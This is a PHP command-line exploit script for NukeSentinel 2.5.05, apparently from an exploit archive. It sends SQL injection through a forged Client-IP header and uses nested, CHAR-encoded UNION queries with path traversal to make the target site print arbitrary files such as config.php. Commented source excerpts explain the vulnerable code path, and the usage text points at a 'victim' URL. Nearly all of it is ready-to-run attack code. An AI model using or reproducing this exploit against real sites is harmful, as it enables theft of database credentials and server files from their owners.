#!/usr/bin/php
<?php
/**
 * This file require the PhpSploit class.
 * If you want to use this class, the latest
 * version can be downloaded from acid-root.new.fr.
 **/
require("phpsploitclass.php");
error_reporting(E_ALL ^ E_NOTICE);

# Module's Description:
# Advanced site security proudly produced by: NukeScripts Network, Raven PHPScripts, & NukeResources.
# ... IS IT A JOKE ?!
#
# SQL Injection --> File Disclosure
# Maybe work on other versions.
# Interesting exploit =)
#
if($argc < 5) {
print("
  NukeSentinel 2.5.05 (nukesentinel.php) File Disclosure Exploit
------------------------------------------------------------------
PHP conditions: none
CMS conditions: disable_switch<=0 (module activated)
       Credits: DarkFig <gmdarkfig@gmail.com>
           URL: http://www.acid-root.new.fr/
    Support us: Just click once on our publicity ;)
------------------------------------------------------------------
  Usage: $argv[0] -url <url> -file <file> [Options]
Example: $argv[0] -url http://www.victim.com/ -file config.php
Options: -proxy     If you wanna use a proxy <proxyhost:proxyport>
         -proxyauth Basic authentification <proxyuser:proxypwd>
------------------------------------------------------------------
"); exit(1);
}

$url   = getparam('url',1);  # http://localhost/php-nuke-7.9/html/
$file  = getparam('file',1); # config.php, admin/.htaccess
$proxy = getparam('proxy');
$authp = getparam('proxyauth');

$xpl = new phpsploit();
$xpl->agent("Mozilla Firefox");
if($proxy) $xpl->proxy($proxy);
if($authp) $xpl->proxyauth($authp);


# +nukesentinel.php
#
# 52. $nsnst_const['server_ip'] = get_server_ip();
# 53. $nsnst_const['client_ip'] = get_client_ip();
# 54. $nsnst_const['forward_ip'] = get_x_forwarded();
# 55. $nsnst_const['remote_addr'] = get_remote_addr();
# 56. $nsnst_const['remote_ip'] = get_ip(); // If $nsnst_const['client_ip'] return it, elseif $nsnst_const['forward_ip']
return it ...
#
#
# $xpl->addheader("Client-IP","<something>255.255.255.255<something>");
# |
# 73. if(!ereg("([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})", $nsnst_const['client_ip']))
{$nsnst_const['client_ip'] = "none"; }
# 74. if(!ereg("([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})", $nsnst_const['forward_ip']))
{$nsnst_const['forward_ip'] = "none"; }
# 75. if(!ereg("([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})", $nsnst_const['remote_ip']))
{$nsnst_const['remote_ip'] = "none"; }
# 76. if(!ereg("([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})", $nsnst_const['remote_addr']))
{$nsnst_const['remote_addr'] = "none"; }
#
#
# 221. // Check if ip is blocked
# 222. $blocked_row = abget_blocked($nsnst_const['remote_ip']);
# 223. if($blocked_row) { blocked($blocked_row);}
#
#
# $xpl->addheader("Client-IP","' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#255.255.255.255");
# |
# 723. function abget_blocked($remoteip) {
# 724.  global $prefix, $db;
# 725.  $ip = explode(".", $remoteip);
# 726.  $testip1 = "$ip[0].*.*.*";                // ' UNION SELECT
1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#255.*.*.*
# 727.  $testip2 = "$ip[0].$ip[1].*.*";           // ' UNION SELECT
1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#255.255.*.*
# 728.  $testip3 = "$ip[0].$ip[1].$ip[2].*";      // ' UNION SELECT
1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#255.255.255.*
# 729.  $testip4 = "$ip[0].$ip[1].$ip[2].$ip[3]"; // ' UNION SELECT
1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#255.255.255.255
# 730.  $blocked_result = $db->sql_query("SELECT * FROM `".$prefix."_nsnst_blocked_ips` WHERE `ip_addr` = '$testip1' OR
`ip_addr` = '$testip2' OR `ip_addr` = '$testip3' OR `ip_addr` = '$testip4'");
# 731.  $blocked_row = $db->sql_fetchrow($blocked_result);
# 732.  return $blocked_row;
# 733. }
#
#
# 1044. function blocked($blocked_row="", $blocker_row="") {
# 1050. if(empty($blocker_row)) { $blocker_row = abget_blockerrow($blocked_row['reason']); } // $blocked_row['reason']
... 6,7,--->8<---,9
#
#
# $xpl->addheader("Client-IP","' UNION SELECT 1,2,3,4,5,6,7,".mysqlchar(' UNION SELECT
-666,2,3,4,5,6,7,'../config.php',9,10,11 ORDER BY blocker #).",9,10,11,12,13,14,15,16,17,18#255.255.255.255");
# |
# 750. function abget_blockerrow($reason){
# 751.  global $prefix, $db;
# 752.  $blockerresult = $db->sql_query("SELECT * FROM `".$prefix."_nsnst_blockers` WHERE `blocker`='$reason'"); // + '
UNION SELECT -666,2,3,4,5,6,7,'../config.php',9,10,11 ORDER BY blocker #
# 753.  $blocker_row = $db->sql_fetchrow($blockerresult);
# 754.  return $blocker_row;
# 755. }
#
#
# 1044. function blocked($blocked_row="", $blocker_row="") {
# 1056.  $display_page = abget_template($blocker_row['template']); // $blocker_row['template'] ...
6,7,--->'../config.php'<---,9
#
#
# 1004. function abget_template($template="") {
# 1013.  $filename = "abuse/".$template; // $template = ../config.php
# 1014.  if(!file_exists($filename)) { $filename = "abuse/abuse_default.tpl"; }
# 1015.  $handle = @fopen($filename, "r");
# 1016.  $display_page = fread($handle, filesize($filename));
# 1017.  @fclose($handle);
# 1041.  return $display_page;
# 1042. }
#
# Interesting isn't it ? :]
#
$sql =  "' UNION SELECT 1,2,3,4,5,6,7,"
       .mysqlchar("' UNION SELECT -666,2,3,4,5,6,7,'../$file',9,10,11 ORDER BY blocker #")
       .",9,10,11,12,13,14,15,16,17,18#255.255.255.255";

$xpl->addheader("Client-IP",$sql);
$xpl->get($url.'index.php');
print $xpl->getcontent();

function mysqlchar($data)
{
        $char='CHAR(';
        for($i=0;$i<strlen($data);$i++)
        {
                $char .= ord($data[$i]);
                if($i != (strlen($data)-1)) $char .= ',';
        }
        return $char.')';
}

function getparam($param,$opt='')
{
        global $argv;
        foreach($argv as $value => $key)
        {
                if($key == '-'.$param) return $argv[$value+1];
        }
        if($opt) exit("\n#3 -$param parameter required");
        else return;
}

?>